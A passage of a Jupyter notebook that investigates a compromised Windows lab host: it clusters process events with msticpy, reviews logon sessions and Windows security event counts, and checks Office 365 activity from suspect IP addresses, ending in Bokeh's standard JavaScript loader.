    "                                     f'count={x.ClusterSize}'),\n",
    "                          axis=1).values.tolist()\n",
    "def get_selected_logon_cluster(selected_item):\n",
    "    acct_match = re.search(r'(?P<acct>[^:]+):\\s+\\(logontype=(?P<l_type>[^)]+)', selected_item)\n",
    "    if acct_match:\n",
    "        acct = acct_match['acct']\n",
    "        l_type = int(acct_match['l_type'])\n",
    "        return host_logons.query('TargetUserName == @acct and LogonType == @l_type')\n",
    "\n",
    "def get_selected_logon(selected_item):\n",
    "    logon_list_regex = r'''\n",
    "(?P<acct>[^:]+):\\s+\n",
    "\\(logontype=(?P<logon_type>[^)]+)\\)\\s+\n",
    "\\(timestamp=(?P<time>[^)]+)\\)\\s+\n",
    "logonid=(?P<logonid>[0-9a-fx)]+)\n",
    "'''\n",
    "    acct_match = re.search(logon_list_regex, selected_item, re.VERBOSE)\n",
    "    if acct_match:\n",
    "        acct = acct_match['acct']\n",
    "        logon_type = int(acct_match['logon_type'])\n",
    "        time_stamp = pd.to_datetime(acct_match['time'])\n",
    "        logon_id = acct_match['logonid']\n",
    "        return host_logons.query('TargetUserName == @acct and LogonType == @logon_type'\n",
    "                                 ' and TargetLogonId == @logon_id')\n",
    "    \n",
    "logon_wgt = mas.SelectString(description='Select logon cluster to examine', \n",
    "                             item_list=items, height='200px', width='100%', auto_display=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Observations\n",
    "- Select the logon account and type that we're interested in"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='process_clustering'></a>[Contents](#toc)\n",
    "## Unusual Processes on Host - Clustering\n",
    "Sometimes you don't have a source process to work with. Other times it's just useful to see what else is going on on the host. This section retrieves all processes on the host within the time bounds\n",
    "set in the query times widget.\n",
    "\n",
    "You can display the raw output of this by looking at the *processes_on_host* dataframe. Just copy this into a new cell and hit Ctrl-Enter.\n",
    "\n",
    "Usually though, the results return a lot of very repetitive and unintersting system processes so we attempt to cluster these to make the view easier to negotiate. \n",
    "To do this we process the raw event list output to extract a few features that render strings (such as commandline)into numerical values. The default below uses the following features:\n",
    "- commandLineTokensFull - this is a count of common delimiters in the commandline \n",
    "  (given by this regex r'[\\s\\-\\\\/\\.,\"\\'|&:;%$()]'). The aim of this is to capture the commandline structure while ignoring variations on what is essentially the same pattern (e.g. temporary path GUIDs, target IP or host names, etc.)\n",
    "- pathScore - this sums the ordinal (character) value of each character in the path (so /bin/bash and /bin/bosh would have similar scores).\n",
    "- isSystemSession - 1 if this is a root/system session, 0 if anything else.\n",
    "\n",
    "Then we run a clustering algorithm (DBScan in this case) on the process list. The result groups similar (noisy) processes together and leaves unique process patterns as single-member clusters."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Getting process events...done\n",
      "Clustering...done\n",
      "Number of input events: 2046\n",
      "Number of clustered events: 151\n",
      "done\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "### View processes used in login session"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bd42adc713f44cbe96edda9e96e39920",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "interactive(children=(Select(description='Select logon instance to examine', layout=Layout(width='95%'), optio…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "selected_logon_cluster = get_selected_logon_cluster(logon_wgt.value)\n",
    "\n",
    "# Calculate time range based on the logons from previous section\n",
    "logon_time = selected_logon_cluster['TimeGenerated'].min()\n",
    "last_logon_time = selected_logon_cluster['TimeGenerated'].max()\n",
    "time_diff_delta = (last_logon_time - logon_time)\n",
    "\n",
    "# set the origin time to the time of our alert\n",
    "params_dict['start'] = logon_time - timedelta(seconds=(1 * 60 * 60))\n",
    "params_dict['end'] = logon_time + time_diff_delta + timedelta(seconds=(2 * 60 * 60))\n",
    "\n",
    "\n",
    "from msticpy.sectools.eventcluster import dbcluster_events, add_process_features\n",
    "print('Getting process events...', end='')\n",
    "processes_on_host = qry.list_processes(**params_dict)\n",
    "print('done')\n",
    "print('Clustering...', end='')\n",
    "feature_procs = add_process_features(input_frame=processes_on_host,\n",
    "                                     path_separator=params_dict['path_separator'])\n",
    "\n",
    "feature_procs['accountNum'] = feature_procs.apply(lambda x: _string_score(x.Account), axis=1)\n",
    "# you might need to play around with the max_cluster_distance parameter.\n",
    "# decreasing this gives more clusters.\n",
    "(clus_events, dbcluster, x_data) = dbcluster_events(data=feature_procs,\n",
    "                                                    cluster_columns=['commandlineTokensFull', \n",
    "                                                                     'pathScore',\n",
    "                                                                     'accountNum',\n",
    "                                                                     'isSystemSession'],\n",
    "                                                    max_cluster_distance=0.0001)\n",
    "print('done')\n",
    "print('Number of input events:', len(feature_procs))\n",
    "print('Number of clustered events:', len(clus_events))\n",
    "(clus_events.sort_values('TimeGenerated')[['TimeGenerated', 'LastEventTime',\n",
    "                                          'NewProcessName', 'CommandLine', \n",
    "                                          'ClusterSize', 'commandlineTokensFull',\n",
    "                                          'pathScore', 'isSystemSession']]\n",
    "    .sort_values('ClusterSize', ascending=False))\n",
    "print('done')\n",
    "\n",
    "\n",
    "display(Markdown('### View processes used in login session'))\n",
    "\n",
    "selected_logon_cluster = get_selected_logon_cluster(logon_wgt.value)\n",
    "\n",
    "def view_logon_sess(x=''):\n",
    "    global selected_logon\n",
    "    selected_logon = get_selected_logon(x)\n",
    "    display(selected_logon)\n",
    "    logonId = selected_logon['TargetLogonId'].iloc[0]\n",
    "    sess_procs = (processes_on_host.query('TargetLogonId == @logonId | SubjectLogonId == @logonId')\n",
    "                                          [['NewProcessName', 'CommandLine', 'TargetLogonId']]\n",
    "                  .drop_duplicates())\n",
    "    display(sess_procs)\n",
    "    \n",
    "\n",
    "items = selected_logon_cluster.sort_values('TimeGenerated').apply(lambda x: (f'{x.TargetUserName}:    '\n",
    "                                        f'(logontype={x.LogonType})   '\n",
    "                                        f'(timestamp={x.TimeGenerated})    '\n",
    "                                        f'logonid={x.TargetLogonId}'),\n",
    "                             axis=1).values.tolist()\n",
    "sess_w = widgets.Select(options=items, description='Select logon instance to examine', **WIDGET_DEFAULTS)\n",
    "    \n",
    "interactive(view_logon_sess, x=sess_w)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Observations\n",
    "- First session listed doesn't look interesting \n",
    "- but the second shows:\n",
    "  - Accounts being added\n",
    "  - Accounts added to local Administrators group\n",
    "  - Permissions removed on RPD/Terminal services logon\n",
    "  - Scheduled task being installed as a means of persistence"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "### EventTypes login session in select time interval"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th>TimeGenerated</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Account</th>\n",
       "      <th>Activity</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th rowspan=\"3\" valign=\"top\"></th>\n",
       "      <th>4776 - The domain controller attempted to validate the credentials for an account.</th>\n",
       "      <td>7</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5058 - Key file operation.</th>\n",
       "      <td>14</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5061 - Cryptographic operation.</th>\n",
       "      <td>14</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"3\" valign=\"top\">MSTICAlertsWin1\\MSTICAdmin</th>\n",
       "      <th>4634 - An account was logged off.</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4798 - A user's local group membership was enumerated.</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8002 - A process was allowed to run.</th>\n",
       "      <td>51</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"16\" valign=\"top\">MSTICAlertsWin1\\ian</th>\n",
       "      <th>4625 - An account failed to log on.</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4634 - An account was logged off.</th>\n",
       "      <td>7</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4672 - Special privileges assigned to new logon.</th>\n",
       "      <td>11</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4720 - A user account was created.</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4722 - A user account was enabled.</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4724 - An attempt was made to reset an account's password.</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4726 - A user account was deleted.</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4728 - A member was added to a security-enabled global group.</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4729 - A member was removed from a security-enabled global group.</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4732 - A member was added to a security-enabled local group.</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4733 - A member was removed from a security-enabled local group.</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4738 - A user account was changed.</th>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4797 - An attempt was made to query the existence of a blank password for an account.</th>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4798 - A user's local group membership was enumerated.</th>\n",
       "      <td>26</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4799 - A security-enabled local group membership was enumerated</th>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8002 - A process was allowed to run.</th>\n",
       "      <td>226</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"2\" valign=\"top\">NT AUTHORITY\\SYSTEM</th>\n",
       "      <th>4672 - Special privileges assigned to new logon.</th>\n",
       "      <td>18</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8002 - A process was allowed to run.</th>\n",
       "      <td>6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"4\" valign=\"top\">WORKGROUP\\MSTICAlertsWin1$</th>\n",
       "      <th>4648 - A logon was attempted using explicit credentials.</th>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4798 - A user's local group membership was enumerated.</th>\n",
       "      <td>84</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4799 - A security-enabled local group membership was enumerated</th>\n",
       "      <td>33</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5059 - Key migration operation.</th>\n",
       "      <td>24</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Window Manager\\DWM-3</th>\n",
       "      <th>4672 - Special privileges assigned to new logon.</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"2\" valign=\"top\">Window Manager\\DWM-4</th>\n",
       "      <th>4634 - An account was logged off.</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4672 - Special privileges assigned to new logon.</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                                                                  TimeGenerated\n",
       "Account                    Activity                                                                                            \n",
       "                           4776 - The domain controller attempted to validate the credentials for an account.                 7\n",
       "                           5058 - Key file operation.                                                                        14\n",
       "                           5061 - Cryptographic operation.                                                                   14\n",
       "MSTICAlertsWin1\\MSTICAdmin 4634 - An account was logged off.                                                                  1\n",
       "                           4798 - A user's local group membership was enumerated.                                             1\n",
       "                           8002 - A process was allowed to run.                                                              51\n",
       "MSTICAlertsWin1\\ian        4625 - An account failed to log on.                                                                1\n",
       "                           4634 - An account was logged off.                                                                  7\n",
       "                           4672 - Special privileges assigned to new logon.                                                  11\n",
       "                           4720 - A user account was created.                                                                 1\n",
       "                           4722 - A user account was enabled.                                                                 1\n",
       "                           4724 - An attempt was made to reset an account's password.                                         2\n",
       "                           4726 - A user account was deleted.                                                                 1\n",
       "                           4728 - A member was added to a security-enabled global group.                                      1\n",
       "                           4729 - A member was removed from a security-enabled global group.                                  1\n",
       "                           4732 - A member was added to a security-enabled local group.                                       2\n",
       "                           4733 - A member was removed from a security-enabled local group.                                   2\n",
       "                           4738 - A user account was changed.                                                                 3\n",
       "                           4797 - An attempt was made to query the existence of a blank password for an account.              4\n",
       "                           4798 - A user's local group membership was enumerated.                                            26\n",
       "                           4799 - A security-enabled local group membership was enumerated                                    3\n",
       "                           8002 - A process was allowed to run.                                                             226\n",
       "NT AUTHORITY\\SYSTEM        4672 - Special privileges assigned to new logon.                                                  18\n",
       "                           8002 - A process was allowed to run.                                                               6\n",
       "WORKGROUP\\MSTICAlertsWin1$ 4648 - A logon was attempted using explicit credentials.                                           5\n",
       "                           4798 - A user's local group membership was enumerated.                                            84\n",
       "                           4799 - A security-enabled local group membership was enumerated                                   33\n",
       "                           5059 - Key migration operation.                                                                   24\n",
       "Window Manager\\DWM-3       4672 - Special privileges assigned to new logon.                                                   2\n",
       "Window Manager\\DWM-4       4634 - An account was logged off.                                                                  2\n",
       "                           4672 - Special privileges assigned to new logon.                                                   2"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display(Markdown('### EventTypes login session in select time interval'))\n",
    "\n",
    "all_events_base_qry = '''\n",
    "SecurityEvent\n",
    "| where Computer =~ '{host}'\n",
    "| where TimeGenerated >= datetime({start})\n",
    "| where TimeGenerated <= datetime({end})\n",
    "| where {where_filter}\n",
    "'''\n",
    "all_events_qry = all_events_base_qry.format(host=params_dict['host_name'],\n",
    "                                            start=params_dict['start'],\n",
    "                                            end=params_dict['end'],\n",
    "                                            where_filter='EventID != 4688 and EventID != 4624')\n",
    "\n",
    "%kql -query all_events_qry\n",
    "all_events_df = _kql_raw_result_.to_dataframe()\n",
    "display(all_events_df[['Account', 'Activity', 'TimeGenerated']]\n",
    "        .groupby(['Account', 'Activity']).count())\n",
    "\n",
    "add_observation(Observation(caption='System account modifications during attack.',\n",
    "                            description='Count of event types seen on system',\n",
    "                            item=all_events_df[['Account', 'Activity', 'TimeGenerated']].groupby(['Account', 'Activity']).count(),\n",
    "                            link='other_win_events'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Observations\n",
    "Some unusual events associated with our compromised account session:\n",
    "- Logon failure\n",
    "- Account creation\n",
    "- Password reset\n",
    "- Security group changes"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='o365'></a>[Contents](#toc)\n",
    "# Office 365 Activity\n",
    "### Check our Office Subscription for anything suspicious"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running queries... done.\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "### Any IP Addresses in our alert IPs that match Office Activity?"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "### Activity for 13.67.35.176"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "No activity detected"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "### Activity for 23.97.60.214"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th>OperationCount</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>UserId</th>\n",
       "      <th>RecordType</th>\n",
       "      <th>Operation</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>ianh@M365x054215.onmicrosoft.com</th>\n",
       "      <th>AzureActiveDirectoryStsLogon</th>\n",
       "      <th>UserLoggedIn</th>\n",
       "      <td>17</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"5\" valign=\"top\">ianh@m365x054215.onmicrosoft.com</th>\n",
       "      <th>AzureActiveDirectoryStsLogon</th>\n",
       "      <th>UserLoginFailed</th>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>SharePoint</th>\n",
       "      <th>PageViewed</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th rowspan=\"3\" valign=\"top\">SharePointFileOperation</th>\n",
       "      <th>FileAccessed</th>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>FileDownloaded</th>\n",
       "      <td>47</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>FilePreviewed</th>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                               OperationCount\n",
       "UserId                           RecordType                   Operation                      \n",
       "ianh@M365x054215.onmicrosoft.com AzureActiveDirectoryStsLogon UserLoggedIn                 17\n",
       "ianh@m365x054215.onmicrosoft.com AzureActiveDirectoryStsLogon UserLoginFailed               3\n",
       "                                 SharePoint                   PageViewed                    1\n",
       "                                 SharePointFileOperation      FileAccessed                  4\n",
       "                                                              FileDownloaded               47\n",
       "                                                              FilePreviewed                 3"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "### Timeline of operations originating from suspect IP Address: 13.67.35.176"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "**13.67.35.176**"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "No activity detected"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "### Timeline of operations originating from suspect IP Address: 23.97.60.214"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "**23.97.60.214**"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.pydata.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"1433\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof (root._bokeh_onload_callbacks) === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  var NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    var el = document.getElementById(\"1433\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) { callback() });\n",
       "    }\n",
       "    finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.info(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(js_urls, callback) {\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.log(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.log(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = js_urls.length;\n",
       "    for (var i = 0; i < js_urls.length; i++) {\n",
       "      var url = js_urls[i];\n",
       "      var s = document.createElement('script');\n",
       "      s.src = url;\n",
       "      s.async = false;\n",
       "      s.onreadystatechange = s.onload = function() {\n",
       "        root._bokeh_is_loading--;\n",
       "        if (root._bokeh_is_loading === 0) {\n",
       "          console.log(\"Bokeh: all BokehJS libraries loaded\");\n",
       "          run_callbacks()\n",
       "        }\n",
       "      };\n",
       "      s.onerror = function() {\n",
       "        console.warn(\"failed to load library \" + url);\n",
       "      };\n",
       "      console.log(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.getElementsByTagName(\"head\")[0].appendChild(s);\n",
       "    }\n",
       "  };var element = document.getElementById(\"1433\");\n",
       "  if (element == null) {\n",
       "    console.log(\"Bokeh: ERROR: autoload.js configured with elementid '1433' but no matching script tag was found. \")\n",
       "    return false;\n",
       "  }\n",
       "\n",
       "  var js_urls = [\"https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-gl-1.0.4.min.js\"];\n",
       "\n",
       "  var inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    \n",
       "    function(Bokeh) {\n",
       "      \n",
       "    },\n",
